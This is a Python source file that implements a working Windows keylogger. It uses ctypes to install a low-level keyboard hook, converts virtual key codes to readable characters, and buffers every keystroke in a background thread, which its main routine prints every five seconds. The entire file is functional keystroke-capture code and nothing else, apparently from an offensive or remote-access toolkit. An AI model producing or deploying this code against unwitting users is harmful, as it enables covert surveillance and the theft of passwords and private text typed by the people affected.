# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
import sys
from ctypes import *
from ctypes.wintypes import MSG, DWORD, HINSTANCE, HHOOK, WPARAM, LPARAM, BOOL, LPCWSTR, HMODULE
import threading
import time
import platform


LRESULT = c_int64 if platform.architecture()[0] == "64bit" else c_long
HOOKPROC = WINFUNCTYPE(LRESULT, c_int, WPARAM, POINTER(c_void_p))
user32=windll.user32

#some windows function defines :
SetWindowsHookEx = user32.SetWindowsHookExA
SetWindowsHookEx.restype = HHOOK
SetWindowsHookEx.argtypes = [c_int, HOOKPROC, HINSTANCE, DWORD]
CallNextHookEx = user32.CallNextHookEx
CallNextHookEx.restype = LRESULT
CallNextHookEx.argtypes = [HHOOK, c_int, WPARAM, POINTER(c_void_p)]
UnhookWindowsHookEx = user32.UnhookWindowsHookEx
UnhookWindowsHookEx.restype = BOOL
UnhookWindowsHookEx.argtypes = [HHOOK]
GetModuleHandleW=windll.kernel32.GetModuleHandleW
GetModuleHandleW.restype = HMODULE
GetModuleHandleW.argtypes = [LPCWSTR]


WH_KEYBOARD_LL=13
WM_KEYDOWN=0x0100

keyCodes={
	0x08 : "[BKSP]",
	0x09 : "[TAB]",
	0x0D : "\n",
	0x10 : "[SHIFT]",
	0x11 : "[CTRL]",
	0x12 : "[ALT]",
	0x13 : "[PAUSE]",
	0x14 : "[CAPS_LOCK]",
	0x1B : "[ESCAPE]",
	0x20 : " ",
	0x25 : "[LEFT]",
	0x26 : "[UP]",
	0x27 : "[RIGHT]",
	0x28 : "[DOWN]",
	0x2C : "[PRINT_SCREEN]",
	0x2E : "[DEL]",
	0x90 : "[NUM_LOCk]",
	0xA0 : "[LSHIFT]",
	0xA1 : "[RSHIFT]",
	0xA2 : "[LCTRL]",
	0xA3 : "[RCTRL]",
	0xA4 : "[LMENU]",
	0xA5 : "[RMENU]",
}

class KeyLogger(threading.Thread):
	def __init__(self, *args, **kwargs):
		threading.Thread.__init__(self, *args, **kwargs)
		self.hooked	 = None
		self.daemon=True
		self.keys_buffer=""
		self.pointer=None
		self.stopped=False

	def run(self):
		self.install_hook()
		msg = MSG()
		windll.user32.GetMessageA(byref(msg),0,0,0)
		while not self.stopped:
			time.sleep(1)
		self.uninstall_hook()
			
	def stop(self):
		self.stopped=True

	def dump(self):
		res=self.keys_buffer
		self.keys_buffer=""
		return res

	def convert_key_code(self, code):
		#https://msdn.microsoft.com/fr-fr/library/windows/desktop/dd375731%28v=vs.85%29.aspx
		code=c_long(code).value
		if code >=0x41 and code <=0x5a: # letters
			return chr(code)
		elif code>=0x30 and code <=0x39: # numbers
			return str(code-0x30)
		elif code>=0x60 and code <=0x69: # keypad numbers
			return str(code-0x60)
		elif code in keyCodes:
			return keyCodes[code]
		return "[%02x]"%code

	def install_hook(self):
		self.pointer = HOOKPROC(self.hook_proc)
		modhwd=GetModuleHandleW(None)
		self.hooked = SetWindowsHookEx(WH_KEYBOARD_LL, self.pointer, modhwd, 0)
		if not self.hooked:
			raise WinError()
		return True
	
	def uninstall_hook(self):												  
		if self.hooked is None:
			return
		UnhookWindowsHookEx(self.hooked)
		self.hooked = None

	def hook_proc(self, nCode, wParam, lParam):
		if wParam != WM_KEYDOWN:
			return CallNextHookEx(self.hooked, nCode, wParam, lParam)
		hooked_key = self.convert_key_code(lParam[0])
		self.keys_buffer+=hooked_key
		return CallNextHookEx(self.hooked, nCode, wParam, lParam)	 

if __name__=="__main__":
	keyLogger = KeyLogger()
	keyLogger.start()
	while True:
		time.sleep(5)
		print keyLogger.dump()


